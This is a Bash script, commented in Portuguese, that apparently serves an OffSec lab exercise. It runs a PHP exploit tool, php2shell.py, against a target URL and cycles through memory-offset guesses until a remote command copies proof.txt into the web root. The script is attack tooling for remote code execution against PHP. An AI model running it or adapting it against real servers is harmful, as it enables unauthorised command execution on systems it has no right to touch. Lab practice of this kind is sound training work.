#!/bin/bash
# run_godylockz.sh — exploit godylockz (php2shell.py) contra o lab OffSec
# Replica a abordagem do walkthrough (Cyril Shaji) com as adaptações do lab.
#
# Uso:
#   ./run_godylockz.sh               → OffSec lab ($IP ou 192.168.170.10)
#   ./run_godylockz.sh <url>         → URL específica

set -u

URL="${1:-http://${IP:-192.168.170.10}/index.php}"
HOST=$(echo "$URL" | sed -E 's|https?://([^:/]+).*|\1|')
PORT=$(echo "$URL" | grep -oP '://[^:/]+:\K[0-9]+' || echo 80)
BASE="http://$HOST:$PORT"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'

echo -e "${CYAN}═══════════════════════════════════════════════${NC}"
echo -e "${CYAN}  php2shell.py — CVE-2026-109618 pDestructor${NC}"
echo -e "${CYAN}═══════════════════════════════════════════════${NC}"
echo ""
echo "  Alvo: $URL"
echo "  Perfil: php-8.5.11-noble-amd64 (pointer_range 0x6F-0x80)"
echo "  Comando: cp ../p* .  (copia proof.txt para web root)"
echo ""

# Teste de conectividade
echo -e "${YELLOW}[CHECK]${NC} Conectividade com $HOST:$PORT..."
if ! curl -s --max-time 5 -o /dev/null "$BASE/"; then
    echo -e "${RED}[FAIL]${NC} Não consegui conectar em $HOST:$PORT"
    exit 1
fi
echo -e "${GREEN}[OK]${NC} Target acessível"

# Versão do PHP
HEADERS=$(curl -sI --max-time 5 "$BASE/index.php" 2>/dev/null)
PHP_LINE=$(echo "$HEADERS" | grep -i '^X-Powered-By:' | tr -d '\r')
echo "  $PHP_LINE"

# Verifica se proof.txt já existe
PROOF_CHECK=$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 "$BASE/proof.txt")
if [ "$PROOF_CHECK" = "200" ]; then
    echo -e "${GREEN}[!]${NC} proof.txt JÁ acessível!"
    curl -s --max-time 5 "$BASE/proof.txt"
    exit 0
fi
echo ""

# htdata_offset candidates: 8.4.26 value, then neighbors
HTDATA_OFFSETS=("0x690D8" "0x6E0D8" "0x6B0D8" "0x700D8" "0x660D8" "0x720D8")
PROFILES=("profiles/php-8.5.11-noble-amd64.json" "php-offsec-lab")

ATTEMPT=0
MAX_ATTEMPTS=30

for PROFILE in "${PROFILES[@]}"; do
  for HTDATA in "${HTDATA_OFFSETS[@]}"; do
    if [ $ATTEMPT -ge $MAX_ATTEMPTS ]; then break 2; fi
    ATTEMPT=$((ATTEMPT + 1))
    echo -e "${YELLOW}===== TENTATIVA $ATTEMPT/$MAX_ATTEMPTS (profile=$(basename $PROFILE .json) htdata=$HTDATA) =====${NC}"

    python3 php2shell.py exploit \
      -u "$URL" \
      --allow-remote \
      --profile "$PROFILE" \
      --htdata-offset "$HTDATA" \
      --cmd 'cp ../p* .' \
      --retries 1 \
      --force \
      --no-probe \
      --timeout 30

    RC=$?

    sleep 1
    CHECK=$(curl -s --max-time 5 "$BASE/proof.txt" 2>/dev/null)
    if [ -n "$CHECK" ] && ! echo "$CHECK" | grep -qiE "404|Not Found|Forbidden"; then
        echo ""
        echo -e "${GREEN}═══════════════════════════════════════════════${NC}"
        echo -e "${GREEN}  FLAG ENCONTRADA! (profile=$PROFILE htdata=$HTDATA)${NC}"
        echo -e "${GREEN}═══════════════════════════════════════════════${NC}"
        echo "$CHECK"
        exit 0
    fi

    if [ $RC -eq 0 ]; then
        echo -e "${GREEN}[+]${NC} Exploit reportou sucesso mas flag não apareceu."
    else
        echo -e "${RED}[-]${NC} rc=$RC"
    fi
    echo ""
    sleep 1
  done
done

echo ""
echo -e "${RED}[-] $MAX_ATTEMPTS tentativas esgotadas.${NC}"
echo "Diagnóstico:"
echo "  - Stage 1 falha → memory_limit pode ser 128M (big field insuficiente)"
echo "  - Stage 2 falha → dtor_offset errado para este build"
echo "  - Stage 3 falha → htdata_offset errado (tentamos: ${HTDATA_OFFSETS[*]})"
echo "  - Tente: curl $BASE/proof.txt"
exit 1
